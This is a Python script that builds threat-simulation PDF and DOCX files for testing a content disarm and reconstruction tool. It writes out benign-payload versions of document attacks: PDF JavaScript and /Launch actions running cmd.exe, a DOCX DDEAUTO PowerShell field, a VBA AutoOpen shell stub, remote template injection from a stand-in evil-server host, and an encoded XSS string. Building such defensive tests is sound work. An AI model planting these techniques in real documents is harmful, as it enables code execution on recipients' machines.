"""
create_test_files.py — Generate threat-laden test files for Aegis-CDR validation
Run: python create_test_files.py
"""

import os
import zipfile
import io
from pathlib import Path

OUT = Path("test_files")
OUT.mkdir(exist_ok=True)


# ══════════════════════════════════════════════════════════════════
# 1. Malicious PDF
# ══════════════════════════════════════════════════════════════════

def create_malicious_pdf():
    objects = {}

    objects[1] = (
        b"<< /Type /Catalog\n"
        b"   /Pages 2 0 R\n"
        b"   /OpenAction << /S /JavaScript /JS (app.alert('Aegis Test: JS fired!');) >>\n"
        b"   /AA << /WC << /S /JavaScript /JS (app.alert('Close action!');) >> >>\n"
        b">>"
    )

    objects[2] = (
        b"<< /Type /Pages\n"
        b"   /Kids [3 0 R]\n"
        b"   /Count 1\n"
        b">>"
    )

    objects[3] = (
        b"<< /Type /Page\n"
        b"   /Parent 2 0 R\n"
        b"   /MediaBox [0 0 612 792]\n"
        b"   /Contents 4 0 R\n"
        b"   /Resources << /Font << /F1 5 0 R >> >>\n"
        b"   /AA << /O << /S /JavaScript /JS (app.alert('Page open!');) >> >>\n"
        b"   /Annots [6 0 R 7 0 R]\n"
        b">>"
    )

    page_content = (
        b"BT\n"
        b"/F1 16 Tf\n"
        b"72 700 Td\n"
        b"(AEGIS CDR - THREAT SIMULATION DOCUMENT) Tj\n"
        b"0 -30 Td\n"
        b"/F1 11 Tf\n"
        b"(This PDF contains simulated malicious structures for CDR testing.) Tj\n"
        b"0 -20 Td\n"
        b"(Threats: /OpenAction JS, /AA, /Launch, /EmbeddedFile, /URI) Tj\n"
        b"ET\n"
    )
    objects[4] = (
        b"<< /Length " + str(len(page_content)).encode() + b" >>\n"
        b"stream\n" + page_content + b"\nendstream"
    )

    objects[5] = (
        b"<< /Type /Font\n"
        b"   /Subtype /Type1\n"
        b"   /BaseFont /Helvetica\n"
        b">>"
    )

    objects[6] = (
        b"<< /Type /Annot\n"
        b"   /Subtype /Link\n"
        b"   /Rect [72 600 300 620]\n"
        b"   /A << /S /Launch\n"
        b"          /Win << /F (cmd.exe) /P (/c calc.exe) /O (open) >>\n"
        b"       >>\n"
        b">>"
    )

    objects[7] = (
        b"<< /Type /Annot\n"
        b"   /Subtype /Link\n"
        b"   /Rect [72 560 300 580]\n"
        b"   /A << /S /URI /URI (https://evil-tracker.example.com/track?id=12345) >>\n"
        b">>"
    )

    embedded_content = b"Simulated malicious embedded file payload."
    objects[8] = (
        b"<< /Type /EmbeddedFile\n"
        b"   /Length " + str(len(embedded_content)).encode() + b"\n"
        b">>\n"
        b"stream\n" + embedded_content + b"\nendstream"
    )

    objects[9] = (
        b"<< /Type /Filespec\n"
        b"   /F (malware_payload.exe)\n"
        b"   /EF << /F 8 0 R >>\n"
        b">>"
    )

    pdf = b"%PDF-1.7\n"
    pdf += b"%\xe2\xe3\xcf\xd3\n"

    offsets = {}
    for obj_num in sorted(objects.keys()):
        offsets[obj_num] = len(pdf)
        pdf += ("%d 0 obj\n" % obj_num).encode()
        pdf += objects[obj_num]
        pdf += b"\nendobj\n\n"

    xref_offset = len(pdf)
    pdf += b"xref\n"
    pdf += ("0 %d\n" % (len(objects) + 1)).encode()
    pdf += b"0000000000 65535 f \n"
    for obj_num in sorted(objects.keys()):
        pdf += ("%010d 00000 n \n" % offsets[obj_num]).encode()

    pdf += b"trailer\n"
    pdf += ("<< /Size %d\n   /Root 1 0 R\n>>\n" % (len(objects) + 1)).encode()
    pdf += b"startxref\n"
    pdf += ("%d\n" % xref_offset).encode()
    pdf += b"%%EOF\n"

    path = OUT / "malicious_test.pdf"
    path.write_bytes(pdf)
    print("OK Created: %s (%d bytes)" % (path, len(pdf)))
    print("   Threats: /OpenAction+JS, /AA, /Launch, /EmbeddedFile, /URI")


# ══════════════════════════════════════════════════════════════════
# 2. Malicious DOCX
# ══════════════════════════════════════════════════════════════════

def create_malicious_docx():
    buf = io.BytesIO()

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:

        zf.writestr("[Content_Types].xml", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
            '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
            '  <Default Extension="xml" ContentType="application/xml"/>\n'
            '  <Override PartName="/word/document.xml"\n'
            '    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
            '  <Override PartName="/word/vbaProject.bin"\n'
            '    ContentType="application/vnd.ms-office.activeX+xml"/>\n'
            '  <Override PartName="/word/activeX/activeX1.xml"\n'
            '    ContentType="application/vnd.ms-office.activeX+xml"/>\n'
            '</Types>')

        zf.writestr("_rels/.rels", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1"\n'
            '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"\n'
            '    Target="word/document.xml"/>\n'
            '</Relationships>')

        zf.writestr("word/_rels/document.xml.rels", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
            '  <Relationship Id="rId1"\n'
            '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"\n'
            '    Target="https://evil-server.example.com/templates/malicious.dotm"\n'
            '    TargetMode="External"/>\n'
            '  <Relationship Id="rId2"\n'
            '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"\n'
            '    Target="https://phishing.example.com/steal?data=credentials"\n'
            '    TargetMode="External"/>\n'
            '  <Relationship Id="rId3"\n'
            '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"\n'
            '    Target="https://tracker.example.com/pixel.gif?uid=abc123"\n'
            '    TargetMode="External"/>\n'
            '  <Relationship Id="rId4"\n'
            '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject"\n'
            '    Target="vbaProject.bin"/>\n'
            '</Relationships>')

        zf.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"\n'
            '            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">\n'
            '  <w:body>\n'
            '    <w:p><w:r><w:t>AEGIS CDR THREAT SIMULATION DOCUMENT</w:t></w:r></w:p>\n'
            '    <w:p><w:r><w:t>This DOCX contains simulated malicious structures.</w:t></w:r></w:p>\n'
            '    <w:p>\n'
            '      <w:hyperlink r:id="rId2"><w:r><w:t>Phishing link</w:t></w:r></w:hyperlink>\n'
            '    </w:p>\n'
            '    <w:p>\n'
            '      <w:r><w:fldChar w:fldCharType="begin"/></w:r>\n'
            '      <w:r><w:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/c powershell -EncodedCommand ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=" </w:instrText></w:r>\n'
            '      <w:r><w:fldChar w:fldCharType="end"/></w:r>\n'
            '    </w:p>\n'
            '    <w:p>\n'
            '      <w:r><w:fldChar w:fldCharType="begin"/></w:r>\n'
            '      <w:r><w:instrText> MACROBUTTON AcceptAllChangesShown "Click to enable content" </w:instrText></w:r>\n'
            '      <w:r><w:fldChar w:fldCharType="end"/></w:r>\n'
            '    </w:p>\n'
            '    <w:p><w:r><w:t>Normal document content here.</w:t></w:r></w:p>\n'
            '  </w:body>\n'
            '</w:document>')

        zf.writestr("word/settings.xml", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"\n'
            '            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">\n'
            '  <w:attachedTemplate r:id="rId1"/>\n'
            '  <w:mailMerge><w:mainDocumentType w:val="formLetters"/></w:mailMerge>\n'
            '</w:settings>')

        # VBA binary: OLE2 magic bytes + AutoOpen stub
        vba_magic = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
        vba_clsid = b"\x00" * 8
        vba_ver   = b"\x3e\x00\x03\x00"
        vba_name  = b"VBAProject\x00" * 4
        vba_code  = b"AutoOpen\x00Sub AutoOpen()\r\nShell \"cmd.exe /c calc.exe\"\r\nEnd Sub\x00"
        vba_pad   = b"\x00" * 256
        vba_stub  = vba_magic + vba_clsid + vba_ver + vba_name + vba_code + vba_pad
        zf.writestr("word/vbaProject.bin", vba_stub)

        zf.writestr("word/activeX/activeX1.xml", '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            '<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX"\n'
            '        ax:classid="{D7053240-CE69-11CD-A777-00DD01143C57}"\n'
            '        ax:persistence="persistPropertyBag">\n'
            '  <ax:ocxPr ax:name="Caption" ax:value="Click Me"/>\n'
            '</ax:ocx>')

        zf.writestr("customXml/item1.xml", '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<root><payload>PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=</payload></root>')
        zf.writestr("customXml/_rels/item1.xml.rels", '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>')
        zf.writestr("customXml/itemProps1.xml", '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml"\n'
            '  ds:itemID="{12345678-ABCD-EF12-3456-789ABCDEF012}"/>')

    data = buf.getvalue()
    path = OUT / "malicious_test.docx"
    path.write_bytes(data)
    print("\nOK Created: %s (%d bytes)" % (path, len(data)))
    print("   Threats: vbaProject.bin, attachedTemplate, DDEAUTO, MACROBUTTON, 2x hyperlinks, ActiveX, customXml")


# ══════════════════════════════════════════════════════════════════
# 3. Extension-spoofed file (blocked at Layer 1)
# ══════════════════════════════════════════════════════════════════

def create_spoofed_file():
    fake_exe = b"MZ\x90\x00\x03\x00" + b"\x00" * 58 + b"This program cannot be run in DOS mode.\r\r\n"
    path = OUT / "spoofed_exe.pdf"
    path.write_bytes(fake_exe)
    print("\nOK Created: %s (%d bytes)" % (path, len(fake_exe)))
    print("   Extension: .pdf  |  Magic bytes: MZ (Windows PE executable)")
    print("   Expected: BLOCKED at Layer 1 fingerprint check")


# ══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 58)
    print("  Aegis-CDR Test File Generator")
    print("=" * 58)

    create_malicious_pdf()
    create_malicious_docx()
    create_spoofed_file()

    print("\n" + "=" * 58)
    print("  Upload each to http://localhost:8000 and verify:")
    print()
    print("  malicious_test.pdf  -> Risk HIGH/CRITICAL, threats found")
    print("  malicious_test.docx -> Risk HIGH/CRITICAL, threats found")
    print("  spoofed_exe.pdf     -> BLOCKED at fingerprint stage")
    print("=" * 58)